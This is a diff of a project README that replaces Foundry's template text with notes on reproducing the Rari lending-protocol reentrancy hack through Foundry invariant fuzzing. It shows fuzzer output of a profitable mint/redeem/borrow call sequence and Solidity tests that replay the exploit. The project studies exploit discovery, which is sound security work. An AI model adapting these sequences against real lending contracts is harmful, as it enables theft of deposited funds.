@@ -1,66 +1,59 @@
-## Foundry
+## foundry-rari-hack
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+<https://github.com/rappie/echidna-rari-hack> ported to Foundry
 
-Foundry consists of:
+Using a single test account (compared to 3 in original repo), account realizing a profit of 14.042565409259645499 ETH.
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
-
-## Documentation
-
-https://book.getfoundry.sh/
-
-## Usage
-
-### Build
-
-```shell
-$ forge build
 ```
+forge test --mt invariant_test_profit --show-progress
 
-### Test
+Failing tests:
+Encountered 1 failing test in test/RariTest.sol:RariTest
+[FAIL. Reason: revert: Account1 profit!]
+        [Sequence]
+                sender=0x000000000000000000000000000bE84d606FcFEb addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=mint(uint256) args=[34480686646904748734687845775862632361229606401142 [3.448e49]]
+                sender=0x24Db7996672835FDCAF432C2b5AB2747FDDB1188 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[146819705882536770626717166753626284388 [1.468e38]]
+                sender=0x0000000000000000000000000000000000001FC6 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[12060 [1.206e4]]
+                sender=0x000000000000000000000000000000000000145d addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[4183609847315272917562030534181 [4.183e30]]
+                sender=0x0000000000000000000000000000000000000507 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[122731788134496338 [1.227e17]]
+                sender=0x98F4aF0415472981fFB8bd6B060f9137618A5EB4 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[21265 [2.126e4]]
+                sender=0x00000000000000000000000000024975E270Ee27 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[9343]
+                sender=0x00000000000000000000000000000000371Fd8E5 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[54614006384459053945509674884461949487903176697932797427761530591 [5.461e64]]
+                sender=0x0000000000000000000000000000000000000Fe5 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[2212145813418856138753290481425584633259254370 [2.212e45]]
+                sender=0x0000000000000000000000000002673d67aE27E3 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=borrow(uint256) args=[4760753135904324988326715789554485535 [4.76e36]]
+                sender=0x0000000000000000000000000000000000000507 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[447649540520714 [4.476e14]]
+ ```
 
-```shell
-$ forge test
-```
+Sequences repro tests
 
-### Format
+```Solidity
+    function testRariHackEchidna() public {
+        handler.setReentrancyEnabled(true);
+        handler.mint(
+            10089325332519370949262917519849428342404732088146691233195543578618300570336
+        );
+        handler.setReentrancyCallback(4);
+        handler.borrow(1164710473815707741);
+        handler.redeem(995200615491);
+        checkInvariant();
+    }
 
-```shell
-$ forge fmt
-```
-
-### Gas Snapshots
-
-```shell
-$ forge snapshot
-```
-
-### Anvil
-
-```shell
-$ anvil
-```
-
-### Deploy
-
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
+    function testRariHackFoundry() public {
+        handler.setReentrancyEnabled(true);
+        handler.mint(34480686646904748734687845775862632361229606401142);
+        handler.redeem(146819705882536770626717166753626284388);
+        handler.redeem(12060);
+        handler.redeem(4183609847315272917562030534181);
+        handler.redeem(122731788134496338);
+        handler.redeem(21265);
+        handler.redeem(9343);
+        handler.redeem(
+            54614006384459053945509674884461949487903176697932797427761530591
+        );
+        handler.redeem(2212145813418856138753290481425584633259254370);
+        handler.setReentrancyCallback(4);
+        handler.borrow(4760753135904324988326715789554485535);
+        handler.redeem(447649540520714);
+        checkInvariant();
+    }
 ```
